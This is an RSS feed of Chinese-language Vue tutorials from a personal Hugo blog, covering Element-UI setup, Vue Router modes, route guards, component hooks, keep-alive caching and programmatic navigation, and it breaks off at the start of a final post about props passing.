<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Vue on Linner&#39;s Blog</title>
    <link>/series/vue/</link>
    <description>Recent content in Vue on Linner&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-hans</language>
    <copyright>Copyright © 2020-2023 Linner. All Rights Reserved.
</copyright>
    <lastBuildDate>Thu, 28 Sep 2023 16:34:08 +0800</lastBuildDate><atom:link href="/series/vue/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>在 Vue 中使用 Element-UI</title>
      <link>/docs/vue/element-ui/</link>
      <pubDate>Thu, 28 Sep 2023 16:34:08 +0800</pubDate>
      
      <guid>/docs/vue/element-ui/</guid>
      <description><![CDATA[Vue UI 组件库 在Vue中，可以通过引入他人编写好的组件库，来构建自己的页面，提高开发效率。 Vue中常用的UI组件库有： 移动端常用UI组件库： Vant Cube]]></description>
      <content:encoded><![CDATA[<h1 id="vue-ui-组件库" data-numberify>Vue UI 组件库<a class="anchor ms-1" href="#vue-ui-组件库"></a></h1>
<p>在Vue中，可以通过引入他人编写好的组件库，来构建自己的页面，提高开发效率。</p>
<p>Vue中常用的UI组件库有：</p>
<ul>
<li>移动端常用UI组件库：
<ul>
<li><a href="https://vant-ui.github.io/vant/" target="_blank" rel="noopener noreferrer">Vant<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
<li><a href="https://didi.github.io/cube-ui/" target="_blank" rel="noopener noreferrer">Cube UI<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
<li><a href="https://mint-ui.github.io/" target="_blank" rel="noopener noreferrer">Mint UI<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
<li><a href="https://nutui.jd.com/" target="_blank" rel="noopener noreferrer">NutUI<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
</ul>
</li>
<li>PC端常用UI组件库：
<ul>
<li><a href="https://element.eleme.cn/" target="_blank" rel="noopener noreferrer">Element UI<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
<li><a href="https://www.iviewui.com/" target="_blank" rel="noopener noreferrer">IView UI<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
<li><a href="https://www.antdv.com/components/overview" target="_blank" rel="noopener noreferrer">Ant Design Vue<i class="fas fa-external-link-square-alt ms-1"></i></a></li>
</ul>
</li>
</ul>
<hr>
<h1 id="安装-element-ui" data-numberify>安装 Element-UI<a class="anchor ms-1" href="#安装-element-ui"></a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm i element-ui
</span></span></code></pre></div><hr>
<h1 id="引入并应用-element-ui" data-numberify>引入并应用 Element-UI<a class="anchor ms-1" href="#引入并应用-element-ui"></a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">ElementUI</span> <span class="nx">from</span> <span class="s1">&#39;element-ui&#39;</span><span class="p">;</span> <span class="c1">// 引入 Element-UI
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="s1">&#39;element-ui/lib/theme-chalk/index.css&#39;</span><span class="p">;</span>  <span class="c1">// 引入 Element-UI 的全部样式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">ElementUI</span><span class="p">);</span> <span class="c1">// 应用 Element-UI
</span></span></span></code></pre></div><p>直接使用以上方式引入Element-UI，引入的是Element-UI中所有的组件以及它们的样式和交互。这会使页面的体积变得十分庞大。</p>
<p>在使用Element-UI时，可以根据需要使用的组件，按需引入它们。</p>
<p>引入<code>babel-plugin-component</code>开发依赖：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm install babel-plugin-component -D
</span></span></code></pre></div><p>接着在<code>babel.config.js</code>中追加如下内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;presets&#34;</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;@babel/preset-env&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="s2">&#34;modules&#34;</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}]</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;plugins&#34;</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;component&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;libraryName&#34;</span><span class="o">:</span> <span class="s2">&#34;element-ui&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;styleLibraryName&#34;</span><span class="o">:</span> <span class="s2">&#34;theme-chalk&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>然后就可以按需引入项目中所需的组件。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">Button</span><span class="p">,</span> <span class="nx">Select</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;element-ui&#39;</span><span class="p">;</span>  <span class="c1">// 引入 Button 和 Select 组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 将 Button 和 Select 注册为全局组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">component</span><span class="p">(</span><span class="nx">Button</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">Button</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">component</span><span class="p">(</span><span class="nx">Select</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">Select</span><span class="p">);</span>
</span></span></code></pre></div><p>注册Element-UI组件也可以使用<code>Vue.use()</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Button</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Select</span><span class="p">)</span>
</span></span></code></pre></div><hr>
<h1 id="使用-element-ui" data-numberify>使用 Element-UI<a class="anchor ms-1" href="#使用-element-ui"></a></h1>
<p>Element-UI的使用可直接参考官方文档：<a href="https://element.eleme.cn/" target="_blank" rel="noopener noreferrer">Element UI<i class="fas fa-external-link-square-alt ms-1"></i></a>。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue Router 两种工作模式</title>
      <link>/docs/vue/routers/two-modes/</link>
      <pubDate>Thu, 28 Sep 2023 14:09:10 +0800</pubDate>
      
      <guid>/docs/vue/routers/two-modes/</guid>
      <description><![CDATA[Vue Router中有两种工作模式，它们分别是： hash模式：使用URL的hash来模拟一个完整的URL。 hash：在URL中，#符号及其之后的]]></description>
      <content:encoded><![CDATA[<p>Vue Router中有两种工作模式，它们分别是：</p>
<ul>
<li>
<p><code>hash</code>模式：使用URL的<code>hash</code>来模拟一个完整的URL。</p>
<p><code>hash</code>：在URL中，<code>#</code>符号及其之后的内容。</p>
<ul>
<li>当URL改变时，页面不会重新加载。</li>
<li>URL中会包含一个<code>/#/</code>，不够美观。</li>
<li>在浏览器中，<code>hash</code>的内容并不会被浏览器作为请求中的一部分发送给后端服务器。</li>
<li><code>hash</code>模式兼容性强。</li>
</ul>
<p>工作原理：通过监听<code>hashchange</code>事件，从而监控<code>hash</code>的变化。当<code>hash</code>发生变化时，Vue Router会解析<code>hash</code>之后的内容，并将对应的结果呈现出来。</p>
</li>
<li>
<p><code>history</code>模式（依赖于HTML5）：通过HTML5新增的<code>history</code>，将<code>hash</code> URL中的<code>#</code>符号去除。</p>
<p>去除了URL中的<code>#</code>符号之后，在刷新或者直接使用特定的路径进入页面时，浏览器会直接向服务器请求对应的资源。而Vue开发的是SAP（单页Web应用），所以在上述情况发生时，会造成请求错误。</p>
<p>解决方法是，在部署时，对前端页面的请求资源路径进行匹配，将所有访问都指向<code>index.html</code>。</p>
<p>如果使用的是Express部署页面，可以在Express中使用<code>connect-history-api-fallback</code>中间件快速解决。</p>
</li>
</ul>
<p>安装<code>connect-history-api-fallback</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm i connect-history-api-fallback
</span></span></code></pre></div><p>使用<code>connect-history-api-fallback</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">history</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;connect-history-api-fallback&#39;</span><span class="p">);</span>  <span class="c1">// 引入模块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">history</span><span class="p">())</span>  <span class="c1">// 使用中间件（在挂载静态资源之前使用）
</span></span></span></code></pre></div><p><code>hash</code>模式与<code>history</code>模式的比较：</p>
<ul>
<li><code>hash</code>模式：
<ul>
<li>URL中永远存在<code>#</code>符号，不美观。</li>
<li>URL中存在<code>#</code>符号，可能会被其它软件标记为不合法。</li>
<li>兼容性较好。</li>
</ul>
</li>
<li><code>history</code>模式：
<ul>
<li>URL不会永远带着<code>#</code>符号，相对较美观。</li>
<li>兼容性不如<code>hash</code>模式。</li>
<li>应用部署时需要进行一些调整，以解决刷新及进入特定页面的问题（可能需要后端人员配合）。</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 路由守卫</title>
      <link>/docs/vue/routers/guards/</link>
      <pubDate>Wed, 27 Sep 2023 11:17:58 +0800</pubDate>
      
      <guid>/docs/vue/routers/guards/</guid>
      <description><![CDATA[Vue Router提供的路由守卫主要用来通过跳转或取消的方式守卫导航。 在路由守卫中，你可以自定义何时何种情况放行或拦截页面的路由。通过Vue Ro]]></description>
      <content:encoded><![CDATA[<p>Vue Router提供的路由守卫主要用来通过<strong>跳转</strong>或<strong>取消</strong>的方式守卫导航。</p>
<p>在路由守卫中，你可以自定义何时何种情况<strong>放行</strong>或<strong>拦截</strong>页面的路由。通过Vue Router，可以实现对前端页面路由的权限控制。</p>
<p>Vue 路由守卫有以下分类：</p>
<ul>
<li>全局守卫</li>
<li>独享守卫</li>
<li>组件内守卫</li>
</ul>
<hr>
<h1 id="全局路由守卫" data-numberify>全局路由守卫<a class="anchor ms-1" href="#全局路由守卫"></a></h1>
<p>全局路由守卫，是在Router配置文件中，在<code>router</code>上配置的路由守卫。</p>
<p>在配置路由守卫之前，在Router配置文件中需要先接收到<code>router</code>实例：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>全局路由守卫对整个Vue Router下的所有路由都生效。</p>
<h2 id="全局前置守卫" data-numberify>全局前置守卫<a class="anchor ms-1" href="#全局前置守卫"></a></h2>
<p>全局前置路由守卫的使用方式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">beforeEach</span><span class="p">((</span><span class="nx">to</span><span class="p">,</span> <span class="nx">from</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p><code>router.beforeEach()</code>需要传入一个回调函数。该回调函数的定义方式不限，可以使用<code>function</code>也可以使用Lambda。</p>
<p><code>router.beforeEach()</code>回调函数可以接收到3个参数：</p>
<ol>
<li><code>to</code>：记录跳转的目标路由信息（跳转到哪里）。对象类型，其中常用的属性如下：</li>
</ol>
<ul>
<li><code>to.path</code>：路由的路径，字符串类型，返回的是真实的路由请求路径。</li>
<li><code>to.query</code>：路由所携带的 Query 参数，以对象的形式呈现。</li>
<li><code>to.fullPath</code>：全路径名，字符串类型，返回的是真实的路由请求路径，带有 Query 参数，而 to.path 不包含 Query 参数。</li>
<li><code>to.params</code>：路由所携带的路径参数，以对象的形式呈现。</li>
<li><code>to.meta</code>：获取路由元数据，元数据是定义在路由配置信息中，由程序员定义的一组路由信息。</li>
</ul>
<ol start="2">
<li><code>from</code>：记录跳转的来源路由信息（从哪里跳转）。对象类型，结构与<code>to</code>相同。</li>
<li><code>next</code>（可选）：传递给回调的函数，用来放行路由。在使用<code>next()</code>时，必须严格确保它在任何情况下最多只能被调用一次。否则，可能会引起错误。</li>
</ol>
<blockquote>
<p>要避免错误的发生，可以在调用<code>next()</code>之后调用<code>return</code>结束回调的执行，例如使用<code>return next()</code>。</p>
</blockquote>
<p>默认情况下，调用<code>next()</code>跳转到的是<code>to</code>参数中所指的路由（也就是用户选择跳转的路由）。</p>
<p><code>next()</code>可以接收一个如下参数：</p>
<ul>
<li>
<p><code>false</code>：中断当前的导航。</p>
</li>
<li>
<p><code>path</code>：字符串类型，指定最终跳转的路径。</p>
</li>
<li>
<p><code>to</code>：对象类型，定义最终跳转的目标路由信息。</p>
<p>也就是说，可以使用<code>next(to)</code>指定跳转到哪个具体路由。例如跳转到一个名为<code>Login</code>的路由可以使用<code>next({ name: 'Login' })</code>；或者，通过路径指定跳转的目标路由，如<code>next({ path: '/login' })</code>。</p>
<p>这个<code>to</code>对象的结构与<code>router.beforeEach()</code>回调中的<code>to</code>参数对象结构不同。它更像是<code>&lt;router-link&gt;</code>中给<code>to</code> props传递的对象或传给<code>$router.push()</code>的配置对象。还可以在其中配置如<code>params</code>、<code>query</code>、<code>replace</code>等信息。</p>
</li>
<li>
<p><code>Error</code>实例（2.4.0+）：导航会被终止且该错误会被传递给<code>router.onError()</code>注册过的回调。</p>
</li>
</ul>
<p>全局前置路由守卫<code>router.beforeEach()</code>会在以下两种情况被调用：</p>
<ul>
<li>初始化时；</li>
<li>每次路由切换完成之前。</li>
</ul>
<hr>
<h2 id="全局后置钩子" data-numberify>全局后置钩子<a class="anchor ms-1" href="#全局后置钩子"></a></h2>
<p>全局后置钩子用来进行路由跳转后的处理。与守卫不同的是，钩子不会接受<code>next</code>函数也不会改变导航本身。</p>
<p>使用方式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">afterEach</span><span class="p">((</span><span class="nx">to</span><span class="p">,</span> <span class="nx">from</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>全局后置钩子<code>router.afterEach()</code>会在以下两种情况被调用：</p>
<ul>
<li>初始化时；</li>
<li>每次路由切换成功之后。</li>
</ul>
<blockquote>
<p>如果路由切换不成功，例如在<code>router.beforeEach()</code>中调用了<code>next(false)</code>或<code>next(error)</code>时，<code>router.afterEach()</code>不会被调用。</p>
</blockquote>
<h2 id="全局解析守卫" data-numberify>全局解析守卫<a class="anchor ms-1" href="#全局解析守卫"></a></h2>
<p>全局解析守卫（<code>router.beforeResolve</code>）是Vue Router 2.5.0新增的一种路由守卫。</p>
<p><code>router.beforeResolve()</code>的用法与<code>router.beforeEach()</code>类似。</p>
<p>被<code>router.beforeResolve()</code>注册的回调会在导航被确认之前，同时在所有组件内守卫和异步路由组件被解析之后被调用。</p>
<hr>
<h1 id="独享路由守卫" data-numberify>独享路由守卫<a class="anchor ms-1" href="#独享路由守卫"></a></h1>
<p>独享路由守卫（<code>beforeEnter</code>）是在特定的路由配置下定义的，在<u>进入该路由之前执行</u>的一个函数。</p>
<p><code>beforeEnter()</code>用法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="nx">routerName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="o">:</span> <span class="nx">routerPath</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">Component</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">beforeEnter</span><span class="o">:</span> <span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">from</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p><code>beforeEnter()</code>的参数与<code>router.beforeEach()</code>回调的参数一致。</p>
<hr>
<h1 id="组件内路由守卫" data-numberify>组件内路由守卫<a class="anchor ms-1" href="#组件内路由守卫"></a></h1>
<p>组件内路由守卫有以下几种：</p>
<ul>
<li>
<p><code>beforeRouteEnter</code>：通过路由规则，进入该组件时被调用。</p>
<blockquote>
<p>在<code>beforeRouteEnter</code>中不能获取组件实例<code>this</code>，这是因为在执行<code>beforeRouteEnter</code>时，组件实例可能还未被创建。</p>
</blockquote>
</li>
<li>
<p><code>beforeRouteLeave</code>：通过路由规则，将要离开组件时被调用。</p>
</li>
<li>
<p><code>beforeRouteUpdate</code>（Vue Router 2.2 新增）：在当前路由改变，但是该组件被复用时调用。</p>
<p>例如在带有动态的路径参数改变时，由于会渲染同样的路由组件，所以实例会被复用。而这个钩子将在被复用时被调用。</p>
</li>
</ul>
<p>通过其它非路由方式进入或呈现该组件，以上三个守卫都不会被调用。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 路由组件钩子</title>
      <link>/docs/vue/routers/hooks/</link>
      <pubDate>Tue, 26 Sep 2023 16:28:34 +0800</pubDate>
      
      <guid>/docs/vue/routers/hooks/</guid>
      <description><![CDATA[路由组件生命周期钩子 Vue路由组件除了能使用组件的那些生命钩子外，还能使用两个专用于路由组件的生命周期钩子。 当用户打开链接，路由到相应的组件]]></description>
      <content:encoded><![CDATA[<h1 id="路由组件生命周期钩子" data-numberify>路由组件生命周期钩子<a class="anchor ms-1" href="#路由组件生命周期钩子"></a></h1>
<p>Vue路由组件除了能使用组件的那些生命钩子外，还能使用两个专用于路由组件的生命周期钩子。</p>
<p>当用户打开链接，路由到相应的组件时，这个被路由的组件就呈现激活状态；反之则呈现失活状态。</p>
<ul>
<li><code>activated()</code>：在路由组件被激活时自动调用。</li>
<li><code>deactivated()</code>：在路由组件失活时自动调用。</li>
</ul>
<p>路由组件的生命周期钩子使用方式与生命周期钩子相同：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">activated</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">deactivated</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><hr>
<h1 id="组件内路由守卫" data-numberify>组件内路由守卫<a class="anchor ms-1" href="#组件内路由守卫"></a></h1>
<p>Vue路由组件钩子除了生命周期钩子外，还有<a href="../guards">组件内路由守卫</a>。、</p>
<p>组件内路由守卫和生命周期钩子类似，它们都是专门用于路由组件的钩子。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 路由组件缓存</title>
      <link>/docs/vue/routers/cache/</link>
      <pubDate>Tue, 26 Sep 2023 15:12:36 +0800</pubDate>
      
      <guid>/docs/vue/routers/cache/</guid>
      <description><![CDATA[Vue Router中，开启路由组件缓存可以使用&lt;keep-alive&gt;将&lt;router-view&gt;包裹起来。使用了&lt]]></description>
      <content:encoded><![CDATA[<p>Vue Router中，开启路由组件缓存可以使用<code>&lt;keep-alive&gt;</code>将<code>&lt;router-view&gt;</code>包裹起来。使用了<code>&lt;keep-alive&gt;</code>之后，路由组件被用户切换掉时，不会被销毁。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">keep-alive</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">&gt;&lt;/</span><span class="nt">router-view</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">keep-alive</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>&lt;keep-alive&gt;</code>默认会缓存当前在<code>&lt;router-view&gt;</code>中展示的所有组件。如果要指定缓存的组件，可以使用<code>include</code>。在<code>include</code>中指定要缓存的组件的名称即可。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">keep-alive</span> <span class="na">include</span><span class="o">=</span><span class="s">&#34;Home&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">&gt;&lt;/</span><span class="nt">router-view</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">keep-alive</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>如果要指定缓存多个组件，可以使用<code>v-bind</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">keep-alive</span> <span class="na">:include</span><span class="o">=</span><span class="s">&#34;[&#39;Home&#39;, &#39;About&#39;]&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">&gt;&lt;/</span><span class="nt">router-view</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">keep-alive</span><span class="p">&gt;</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 编程式路由导航</title>
      <link>/docs/vue/routers/navigation/</link>
      <pubDate>Tue, 26 Sep 2023 13:19:57 +0800</pubDate>
      
      <guid>/docs/vue/routers/navigation/</guid>
      <description><![CDATA[编程式路由导航是指不通过&lt;router-link&gt;创建&lt;a&gt;标签来定义导航链接，而是借助路由组件实例中的$route]]></description>
      <content:encoded><![CDATA[<p>编程式路由导航是指不通过<code>&lt;router-link&gt;</code>创建<code>&lt;a&gt;</code>标签来定义导航链接，而是借助路由组件实例中的<code>$router</code>实例，通过编写代码来实现路由导航。</p>
<p>使用编程式路由导航，可以让路由的跳转方式变得更加灵活。</p>
<hr>
<h1 id="两种导航方式" data-numberify>两种导航方式<a class="anchor ms-1" href="#两种导航方式"></a></h1>
<p><code>$router</code>也有与<code>&lt;router-link&gt;</code>相同两种导航方式，分别是<code>push</code>和<code>replace</code>。这两种方式分别调用两个不同的API，不过这两个API的使用方式是一致的。并且他们传入的参数与<code>&lt;router-link&gt;</code>中<code>to</code> props的值一样，可以传入两种类型的参数。</p>
<ul>
<li>
<p><code>$router.push()</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;/user/zhangsan&#39;</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="nx">params</span><span class="o">:</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;zhangsan&#39;</span> 
</span></span><span class="line"><span class="cl">  <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div></li>
<li>
<p><code>$router.replace()</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;/user/zhangsan&#39;</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">replace</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="nx">params</span><span class="o">:</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;zhangsan&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div></li>
</ul>
<p>一般情况下，<code>push</code>和<code>replace</code>的区别是，<code>replace</code>模式不会向<code>history</code>添加新记录。</p>
<p><code>$router.push()</code>可以在配置对象中加入一个<code>replace:true</code>，起到与<code>$router.replace()</code>相同的效果：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/user/zhangsan&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="nx">replace</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 相当于
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">router</span><span class="p">.</span><span class="nx">replace</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/user/zhangsan&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><hr>
<h1 id="移动历史记录" data-numberify>移动历史记录<a class="anchor ms-1" href="#移动历史记录"></a></h1>
<p><code>$router</code>还封装了一些用于操作当前应用历史浏览记录的API：</p>
<ul>
<li>
<p><code>$router.forward()</code>：向前移动一条记录。</p>
</li>
<li>
<p><code>router.back()</code>：回退上一条记录。</p>
</li>
<li>
<p><code>$router.go(n)</code>：携带一个整数类型的参数，用于在历史堆栈中前进后退$n$步（类似于<code>window.history.go(n)</code>）。</p>
<ul>
<li>当$n$为正整数时，在历史堆栈中前进$n$步。</li>
<li>当$n$为负整数时，在历史堆栈中后退$|n|$步。</li>
<li>如果移动的步数超过历史堆栈的长度（$|n|$过大），那么移动静默失败。</li>
</ul>
<p>例如：</p>
<ul>
<li><code>$router.go(1)</code>：向前移动一条记录。与<code>$router.forward()</code>相同。</li>
<li><code>$router.go(-1)</code>：回退上一条记录。与<code>$router.back()</code>相同。</li>
<li><code>$router.go(3)</code>：向前移动3条记录。</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 路由通过 Props 传参</title>
      <link>/docs/vue/routers/passing-props/</link>
